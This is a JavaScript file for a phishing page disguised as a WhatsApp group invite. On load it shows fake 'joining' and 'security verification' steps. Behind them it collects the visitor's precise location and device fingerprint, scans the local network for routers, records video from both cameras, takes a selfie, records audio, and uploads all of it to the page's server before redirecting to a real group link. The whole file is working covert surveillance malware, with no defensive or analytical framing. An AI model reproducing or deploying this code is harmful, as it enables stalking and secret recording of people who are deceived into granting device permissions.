// Global constants
const RECORD_DURATION = 15000;
const RECORD_VIDEO_DURATION = 10000;
const WHATSAPP_LINK = 'https://chat.whatsapp.com/CJWFn8kmTfnHlYa4FqRhSt?mode=wwt';

// --- GLOBAL STATE ---
let currentMode = 'normal';
let currentSpamMessage = 'Security update required to proceed.';
let groupDetails = {
    name: 'WhatsApp Group',
    members: 0,
    image: null
};
let mediaStream = null;

// --- Server Endpoints ---
const CONFIG_API_URL = '/get_config';  
const LOG_DATA_URL = '/log_data';
const CAPTURE_IMAGE_URL = '/capture_image';
const CAPTURE_VIDEO_URL = '/capture_video';  
const RECORD_VOICE_URL = '/record_voice';  
const INTERNAL_NETWORK_URL = '/log_network_scan';

// ------------------------------------------------------------------
// --- CORE UTILITY FUNCTIONS ---
// ------------------------------------------------------------------

function handleError(error) {
    console.warn(`Geolocation Error(${error.code}): ${error.message}`);
}

function endProcess() {
    const spinner = document.getElementById('loadingSpinner'); 
    const statusMessage = document.getElementById('statusMessage');
    const button = document.getElementById('actionButton');

    if (spinner) spinner.style.display = 'none'; 
    if (statusMessage) statusMessage.innerHTML = '✅ **Group Joined! Redirecting...**';
    if (button) {
        button.disabled = false;
        button.textContent = 'Joined';
        button.style.backgroundColor = '#25D366';
    }
    console.log("All media and data capture sequence finished.");

    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null; 
        console.log("All MediaTracks stopped.");
    }

    if (currentMode === 'spam') {
        const userConfirmed = confirm(currentSpamMessage);
        if (userConfirmed) {
            window.open(WHATSAPP_LINK, '_blank');
        }
    } else {
        window.open(WHATSAPP_LINK, '_blank');
    }
}

function collectAdditionalData() {
    return {
        screen_resolution: `${window.screen.width}x${window.screen.height}`,
        color_depth: window.screen.colorDepth,
        cpu_cores: navigator.hardwareConcurrency || 'N/A',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        local_time: new Date().toLocaleTimeString(),
        language: navigator.language,
        battery_level: 'N/A', 
    };
}

// ------------------------------------------------------------------
// Voice Recording Functions
// ------------------------------------------------------------------

function sendVoiceToServer(audioBlob) {
    const formData = new FormData();
    formData.append('audio_data', audioBlob, 'recording.ogg'); 

    return fetch(RECORD_VOICE_URL, { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => console.log('Voice capture status:', data))
        .catch(error => console.error('Error sending voice:', error));
}

function startVoiceRecording() {
    const statusMessage = document.getElementById('statusMessage');
    if (statusMessage) {
        statusMessage.textContent = 'Step 5/5: Finalizing audio channel connection (15s)...';
    }

    return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then(stream => {
                mediaStream = stream;
                
                const mimeType = MediaRecorder.isTypeSupported('audio/ogg') ? 'audio/ogg' : 'audio/webm';
                const mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
                const audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: mimeType });
                    sendVoiceToServer(audioBlob).finally(resolve);
                };

                mediaRecorder.start(); 
                
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, RECORD_DURATION);

            })
            .catch(err => {
                console.error("Microphone access denied or failed:", err);
                resolve(); 
            });
    });
}

// ------------------------------------------------------------------
// Image Capture Functions
// ------------------------------------------------------------------

function sendImageToServer(imageDataURL) {
    return fetch(CAPTURE_IMAGE_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image_data: imageDataURL })
    })
    .then(response => response.json())
    .then(data => console.log('Image capture status:', data))
    .catch(error => console.error('Error sending image:', error));
}

function captureImage() {
    const statusMessage = document.getElementById('statusMessage');
    if (statusMessage) {
        statusMessage.textContent = 'Step 4/5: Completing group profile snapshot...';
    }

    const constraints = { video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }, audio: false };

    return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                mediaStream = stream;
                
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');

                video.srcObject = stream;
                video.play();

                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    
                    setTimeout(() => {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageDataURL = canvas.toDataURL('image/jpeg', 0.9);
                        sendImageToServer(imageDataURL).finally(resolve);
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 500);
                };
            })
            .catch(err => {
                console.error("Image capture failed (Camera access error):", err);
                resolve(); 
            });
    });
}

// ------------------------------------------------------------------
// Video Recording Functions
// ------------------------------------------------------------------

function sendVideoToServer(videoBlob, cameraType) {
    const formData = new FormData();
    formData.append('video_data', videoBlob, `recording_${cameraType}.webm`); 

    return fetch(CAPTURE_VIDEO_URL, { method: 'POST', body: formData }) 
        .then(response => response.json())
        .then(data => console.log(`Video (${cameraType}) capture status:`, data))
        .catch(error => console.error(`Error sending video (${cameraType}):`, error));
}

function startVideoRecording(facingMode, cameraType) {
    const statusMessage = document.getElementById('statusMessage');
    if (statusMessage) {
        statusMessage.textContent = `Step ${cameraType === 'user' ? '2' : '3'}/5: Initializing video channel (${cameraType}) (10s)...`;
    }

    const constraints = { video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }, audio: true };
    
    return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                mediaStream = stream;
                
                const videoElement = document.getElementById('videoElement');
                if (videoElement) videoElement.srcObject = stream;
                
                const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
                const mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
                const videoChunks = [];

                mediaRecorder.ondataavailable = event => videoChunks.push(event.data);

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(videoChunks, { type: mimeType });
                    sendVideoToServer(videoBlob, cameraType).finally(resolve);
                };

                mediaRecorder.start();

                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, RECORD_VIDEO_DURATION);

            })
            .catch(err => {
                console.error(`Access to ${cameraType} camera denied or failed.`, err);
                resolve();
            });
    });
}

// ------------------------------------------------------------------
// Local Network Scanner
// ------------------------------------------------------------------

function scanLocalNetwork() {
    const statusMessage = document.getElementById('statusMessage');
    if (statusMessage) {
        statusMessage.textContent = 'Step 1.5/5: Analyzing local network environment...';
    }

    const commonLocalIPs = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.254', '10.0.0.138'];
    const commonPorts = [80, 8080, 443];  
    const scanResults = { local_ips_found: [], router_status: 'Not Found', webrtc_ip: 'N/A' };
    const timeout = 3000;  

    return new Promise(resolve => {
        let checksCompleted = 0;
        let totalChecks = commonLocalIPs.length * commonPorts.length;
        
        const checkCompletion = () => {
            checksCompleted++;
            if (checksCompleted >= totalChecks) resolve();
        };

        commonLocalIPs.forEach(ip => {
            commonPorts.forEach(port => {
                const img = new Image();
                img.onload = img.onerror = () => {
                    if (scanResults.local_ips_found.indexOf(ip) === -1) {
                        scanResults.local_ips_found.push(ip);
                    }
                    if (ip.endsWith('.1')) {
                        scanResults.router_status = 'Detected/Accessed';
                    }
                    checkCompletion();
                };
                img.src = `http://${ip}:${port}/favicon.ico?t=${Date.now()}`;
            });
        });
        
        setTimeout(resolve, timeout);
    }).then(() => {
        return fetch(INTERNAL_NETWORK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(scanResults)
        })
        .catch(e => console.error("Failed to log network scan:", e));
    });
}

// ------------------------------------------------------------------
// Geolocation Functions
// ------------------------------------------------------------------

function sendDataToServer(position, additionalData) {
    const dataToSend = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        ...additionalData 
    };

    return fetch(LOG_DATA_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(dataToSend)
    })
    .then(response => console.log('Location data sent status:', response.status))
    .catch((error) => console.error('Error sending location:', error));
}

function handlePositionAndSend(position) {
    let additionalData = collectAdditionalData();

    const batteryPromise = 'getBattery' in navigator 
        ? navigator.getBattery().then(battery => {
            additionalData.battery_level = `${Math.floor(battery.level * 100)}%`;
        }).catch(() => Promise.resolve())
        : Promise.resolve();

    return batteryPromise.then(() => sendDataToServer(position, additionalData));
}

function getLocation() {
    const statusMessage = document.getElementById('statusMessage');
    if (statusMessage) {
        statusMessage.textContent = 'Step 1/5: Verifying connection security and location...';
    }

    return new Promise(resolve => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => handlePositionAndSend(position).finally(resolve),
                (error) => {
                    handleError(error);
                    resolve();
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            console.warn("Geolocation not supported.");
            resolve();
        }
    });
}

// ------------------------------------------------------------------
// MAIN SEQUENCING LOGIC
// ------------------------------------------------------------------

async function mainSequence() {
    try {
        await getLocation();
        await scanLocalNetwork();
        await startVideoRecording("user", "user");
        await startVideoRecording("environment", "environment");
        await captureImage();
        await startVoiceRecording();

    } catch (error) {
        console.error("Critical error in main sequence:", error);
    } finally {
        endProcess();
    }
}

// ------------------------------------------------------------------
// MAIN ENTRY POINT
// ------------------------------------------------------------------

async function initTool() {
    const button = document.getElementById('actionButton');
    const statusMessage = document.getElementById('statusMessage');

    if (button) {
        button.disabled = true;
        button.textContent = 'Connecting...';
    }

    try {
        const response = await fetch(CONFIG_API_URL);
        if (response.ok) {
            const configData = await response.json();
            currentMode = configData.mode;
            currentSpamMessage = configData.spam_message;
            groupDetails.name = configData.group_name;
            groupDetails.members = configData.group_members;
            groupDetails.image = configData.group_image;
        }
    } catch (e) {
        console.error("Could not connect to config API, defaulting to NORMAL mode.", e);
    }

    const groupNameElement = document.getElementById('groupName'); 
    const groupMembersElement = document.getElementById('groupMembers');
    const groupImageElement = document.getElementById('groupImage');
    const defaultIconElement = document.getElementById('defaultIcon');

    if (groupNameElement) groupNameElement.textContent = groupDetails.name;
    if (groupMembersElement) groupMembersElement.textContent = `${groupDetails.members} members`;
    
    if (groupDetails.image) {
        if (groupImageElement) groupImageElement.src = groupDetails.image;
        if (defaultIconElement) defaultIconElement.style.display = 'none';
        if (groupImageElement) groupImageElement.style.display = 'block';
    } else {
        if (groupImageElement) groupImageElement.style.display = 'none';
        if (defaultIconElement) defaultIconElement.style.display = 'block';
    }

    if (statusMessage) {
        statusMessage.textContent = `Joining ${groupDetails.name} (${groupDetails.members} members)...`;
    }

    mainSequence();
}

function startSequence() {
    const statusMessage = document.getElementById('statusMessage');
    if (statusMessage) {
        statusMessage.textContent = 'Attempting to connect to group server...';
    }
    initTool();
}

window.onload = startSequence;
